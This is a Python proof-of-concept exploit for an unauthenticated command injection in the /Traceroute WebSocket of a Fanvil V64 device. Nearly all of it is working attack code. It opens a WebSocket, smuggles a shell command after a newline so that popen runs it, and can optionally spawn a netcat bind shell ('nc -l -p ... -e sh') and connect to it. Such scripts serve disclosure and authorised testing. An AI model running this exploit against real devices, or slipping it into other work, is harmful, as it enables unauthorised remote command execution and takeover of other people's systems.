#!/usr/bin/env python3
# Fanvil V64 (2.12.17.7) unauthenticated command injection via /Traceroute WebSocket
# Minimal, non-destructive proof of concept.
#
# Usage:
#   python3 poc.py --host <host> --cmd "id; uname -a"
#   python3 poc.py --host <host> --bind-port 4599   # interactive shell helper
#
# The vulnerable server accepts an unauthenticated WebSocket upgrade on /Traceroute
# and /Ping.  The first line of the text frame must look like a URL authority
# ("x" is enough); everything after a newline bypasses the address validation and
# is executed by /bin/sh -c via popen("traceroute %s ").
import argparse, base64, os, socket, struct, sys, time

def ws_connect(host, port, path, ssl=False, timeout=8):
    s = socket.create_connection((host, port), timeout=timeout)
    key = base64.b64encode(os.urandom(16)).decode()
    req = ("GET %s HTTP/1.1\r\nHost: %s:%d\r\nUpgrade: websocket\r\n"
           "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
           "Sec-WebSocket-Version: 13\r\n\r\n" % (path, host, port, key))
    s.sendall(req.encode())
    buf = b""
    while b"\r\n\r\n" not in buf:
        d = s.recv(4096)
        if not d:
            break
        buf += d
    head, _, rest = buf.partition(b"\r\n\r\n")
    if b"101" not in head.split(b"\r\n")[0]:
        raise RuntimeError("WebSocket upgrade failed: %r" % head[:200])
    return s

def ws_send(s, data):
    if isinstance(data, str):
        data = data.encode()
    mask = os.urandom(4)
    n = len(data)
    hdr = bytearray([0x81])
    if n < 126:
        hdr.append(0x80 | n)
    elif n < 65536:
        hdr.append(0x80 | 126); hdr += struct.pack(">H", n)
    else:
        hdr.append(0x80 | 127); hdr += struct.pack(">Q", n)
    s.sendall(bytes(hdr) + mask + bytes(b ^ mask[i % 4] for i, b in enumerate(data)))

def ws_recv(s, timeout=4):
    s.settimeout(timeout)
    out = b""
    try:
        while True:
            h = s.recv(2)
            if len(h) < 2:
                break
            ln = h[1] & 0x7f
            if ln == 126:
                ln = struct.unpack(">H", s.recv(2))[0]
            elif ln == 127:
                ln = struct.unpack(">Q", s.recv(8))[0]
            data = b""
            while len(data) < ln:
                c = s.recv(ln - len(data))
                if not c:
                    break
                data += c
            if h[0] & 0x0f == 8:
                break
            out += data
    except socket.timeout:
        pass
    return out

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--path", default="/Traceroute")
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--bind-port", type=int, default=0,
                    help="start a bind shell on this port instead of using --cmd")
    args = ap.parse_args()

    if args.bind_port:
        payload = "x\nnc -l -p %d -e sh" % args.bind_port
    else:
        payload = "x\n%s" % args.cmd

    s = ws_connect(args.host, args.port, args.path)
    print("[+] WebSocket upgraded on %s:%d%s (no authentication)" % (args.host, args.port, args.path))
    ws_send(s, payload)
    print("[+] Sent frame: %r" % payload)
    try:
        out = ws_recv(s, 3)
        if out:
            print("[+] Server output (first 200 bytes): %r" % out[:200])
    except Exception:
        pass

    if args.bind_port:
        time.sleep(1.5)
        c = socket.create_connection((args.host, args.bind_port), timeout=6)
        c.sendall(b"id; uname -a\n")
        time.sleep(1)
        print("[+] Shell output:")
        print(c.recv(4096).decode(errors="replace"))
        c.close()
    s.close()

if __name__ == "__main__":
    main()
